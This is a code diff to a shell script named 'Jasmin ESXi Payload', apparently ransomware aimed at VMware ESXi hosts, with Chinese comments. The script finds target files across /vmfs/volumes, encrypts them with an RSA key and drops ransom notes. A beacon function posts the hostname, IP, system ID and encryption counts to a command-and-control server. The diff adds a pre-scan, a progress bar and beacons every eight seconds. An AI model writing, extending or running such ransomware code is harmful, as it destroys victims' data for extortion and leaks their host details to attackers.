@@ -1,6 +1,6 @@
 #!/bin/sh
 # Jasmin ESXi Payload — Auto-generated
-# 纯 BusyBox sh + openssl，无 python/xxd 依赖
+# 纯 BusyBox sh + openssl，无 python/xxd 依赖，带加密进度条
 # 关键：强制 C locale，否则 awk sprintf("%c",>=128) 会输出多字节UTF-8，损坏二进制密钥
 export LC_ALL=C
 export LANG=C
@@ -42,6 +42,24 @@ http_post(){
     elif has_cmd curl; then
         curl -s -X POST -d "$2" "$1" >/dev/null 2>&1
     fi
+}
+
+# 人类可读字节数
+fmt_bytes(){
+    awk -v b="$1" 'BEGIN{
+        split("B KB MB GB TB PB",u," ");
+        i=1; while(b>=1024 && i<6){b/=1024;i++}
+        if(i==1) printf "%d%s",b,u[i]; else printf "%.2f%s",b,u[i];
+    }'
+}
+
+# 判断文件是否为加密目标
+is_target(){
+    _e="${1##*.}"
+    for _x in $EXTS; do
+        [ "$_e" = "$_x" ] && return 0
+    done
+    return 1
 }
 
 # ────────────────────────────────────────
@@ -139,6 +157,32 @@ encrypt_file(){
 }
 
 # ────────────────────────────────────────
+# 进度条: draw_bar 已处理数 总数 已处理字节 总字节 [当前文件]
+# ────────────────────────────────────────
+draw_bar(){
+    N="$1"; T="$2"; CB="$3"; TB="$4"; CUR="$5"
+    if [ "$T" -gt 0 ]; then
+        PCT=$((N*100/T))
+    else
+        PCT=100
+    fi
+    [ "$PCT" -gt 100 ] && PCT=100
+
+    # 28格进度条
+    BAR=""
+    I=0
+    while [ "$I" -lt 28 ]; do
+        if [ $((I*100/28)) -lt "$PCT" ]; then BAR="${BAR}#"; else BAR="${BAR}."; fi
+        I=$((I+1))
+    done
+    if [ -z "$CUR" ]; then CUR="-"; fi
+    # 路径截断为固定宽度，避免行长短变化留下残影
+    CUR=$(printf '%s' "$CUR" | awk '{ if(length($0)>44) print "..." substr($0,length($0)-40); else print }')
+    printf '\r  [%s] %3d%%  %d/%d  %s/%s  %-46s' \
+        "$BAR" "$PCT" "$N" "$T" "$(fmt_bytes "$CB")" "$(fmt_bytes "$TB")" "$CUR" >&2
+}
+
+# ────────────────────────────────────────
 # 投放勒索信
 # ────────────────────────────────────────
 drop_notes(){
@@ -155,10 +199,11 @@ drop_notes(){
 }
 
 # ────────────────────────────────────────
-# 回传C2
+# 回传C2 ($6=is_complete $7=total_count $8=total_size)
 # ────────────────────────────────────────
 beacon(){
     SID="$1"; COUNT="$2"; SIZE="$3"; TYPES="$4"; DETAIL="$5"
+    DONE="${6:-1}"; TC="${7:-0}"; TS="${8:-0}"
     HOSTNAME=$(hostname 2>/dev/null || echo "esxi-host")
     OS_VER=$(uname -r 2>/dev/null || echo "ESXi")
     IP=$(esxcli network ip interface ipv4 get 2>/dev/null | awk '/vmk0/{print $2}' | head -1)
@@ -166,7 +211,7 @@ beacon(){
     [ -z "$IP" ] && IP="0.0.0.0"
     DATE=$(date '+%d/%m/%Y, %A' 2>/dev/null)
     TIME_STR=$(date '+%H:%M:%S' 2>/dev/null)
-    DATA="handshake=${SECRET}&machine_name=${HOSTNAME}&computer_user=root&os=ESXi%20${OS_VER}&date=${DATE}&time=${TIME_STR}&ip=${IP}&location=&systemid=${SID}&password=RSA_PROTECTED&encrypted_count=${COUNT}&encrypted_size=${SIZE}&encrypted_types=${TYPES}&encrypted_detail=${DETAIL}"
+    DATA="handshake=${SECRET}&machine_name=${HOSTNAME}&computer_user=root&os=ESXi%20${OS_VER}&date=${DATE}&time=${TIME_STR}&ip=${IP}&location=&systemid=${SID}&password=RSA_PROTECTED&encrypted_count=${COUNT}&encrypted_size=${SIZE}&encrypted_types=${TYPES}&encrypted_detail=${DETAIL}&is_complete=${DONE}&total_count=${TC}&total_size=${TS}"
     http_post "$C2" "$DATA"
 }
 
@@ -182,49 +227,75 @@ main(){
 
     PUBKEY=$(write_pubkey)
 
+    # ── 阶段1: 预扫描统计目标文件总数（进度条分母） ──
+    log "正在扫描目标文件..."
+    TOTAL=0
+    TOTAL_BYTES=0
+    for DS in /vmfs/volumes/*; do
+        [ -d "$DS" ] || continue
+        CL="/tmp/.jcnt_$$"
+        find "$DS" -type f 2>/dev/null > "$CL"
+        while IFS= read -r F; do
+            [ -n "$F" ] || continue
+            if is_target "$F"; then
+                TOTAL=$((TOTAL+1))
+                SZ=$(wc -c < "$F" 2>/dev/null || echo 0)
+                TOTAL_BYTES=$((TOTAL_BYTES+SZ))
+            fi
+        done < "$CL"
+        rm -f "$CL"
+    done
+    log "发现 $TOTAL 个目标文件，合计 $(fmt_bytes "$TOTAL_BYTES")"
+
     COUNT=0
     SIZE=0
     TYPES=""
     FIRST=1
+    LAST_BEACON=$(date +%s)
 
-    for DS in /vmfs/volumes/*; do
-        [ -d "$DS" ] || continue
-        # 先把文件清单落到临时文件，再普通while读取
-        # （避免 find|while 子shell导致 COUNT/SIZE/TYPES 修改丢失）
-        LIST="/tmp/.jlist_$$"
-        find "$DS" -type f 2>/dev/null > "$LIST"
-        while IFS= read -r F; do
-            [ -n "$F" ] || continue
-            EXT="${F##*.}"
-            MATCH=0
-            for E in $EXTS; do
-                if [ "$EXT" = "$E" ]; then MATCH=1; break; fi
-            done
-            [ "$MATCH" = "1" ] || continue
+    if [ "$TOTAL" -gt 0 ]; then
+        for DS in /vmfs/volumes/*; do
+            [ -d "$DS" ] || continue
+            # 先把文件清单落到临时文件，再普通while读取
+            # （避免 find|while 子shell导致 COUNT/SIZE/TYPES 修改丢失）
+            LIST="/tmp/.jlist_$$"
+            find "$DS" -type f 2>/dev/null > "$LIST"
+            while IFS= read -r F; do
+                [ -n "$F" ] || continue
+                is_target "$F" || continue
+                EXT="${F##*.}"
+                FSIZE=$(wc -c < "$F" 2>/dev/null || echo 0)
 
-            FSIZE=$(wc -c < "$F" 2>/dev/null || echo 0)
+                if encrypt_file "$F" "$PUBKEY"; then
+                    COUNT=$((COUNT+1))
+                    SIZE=$((SIZE+FSIZE))
+                    case ",$TYPES," in
+                        *",$EXT,"*) ;;
+                        *) if [ "$FIRST" = "1" ]; then TYPES="$EXT"; FIRST=0; else TYPES="${TYPES},${EXT}"; fi ;;
+                    esac
+                fi
 
-            if encrypt_file "$F" "$PUBKEY"; then
-                COUNT=$((COUNT+1))
-                SIZE=$((SIZE+FSIZE))
-                case ",$TYPES," in
-                    *",$EXT,"*) ;;
-                    *) if [ "$FIRST" = "1" ]; then TYPES="$EXT"; FIRST=0; else TYPES="${TYPES},${EXT}"; fi ;;
-                esac
-                log "  [+] $F ($FSIZE B)"
-            else
-                log "  [-] 跳过: $F"
-            fi
-        done < "$LIST"
-        rm -f "$LIST"
-    done
+                PROCESSED=$((COUNT))
+                draw_bar "$PROCESSED" "$TOTAL" "$SIZE" "$TOTAL_BYTES" "$F"
+
+                # 每8秒回传一次进度
+                NOW=$(date +%s)
+                if [ $((NOW-LAST_BEACON)) -ge 8 ]; then
+                    LAST_BEACON=$NOW
+                    beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}" "0" "$TOTAL" "$TOTAL_BYTES"
+                fi
+            done < "$LIST"
+            rm -f "$LIST"
+        done
+        printf '\n' >&2
+    fi
 
     rm -f "$PUBKEY"
 
-    drop_notes "$SID"
-    beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}"
+    log "加密完成: $COUNT/$TOTAL 个文件, $(fmt_bytes "$SIZE") / $(fmt_bytes "$TOTAL_BYTES")"
 
-    log "完成: 加密 $COUNT 个文件，合计 $SIZE 字节"
+    drop_notes "$SID"
+    beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}" "1" "$TOTAL" "$TOTAL_BYTES"
 }
 
 main
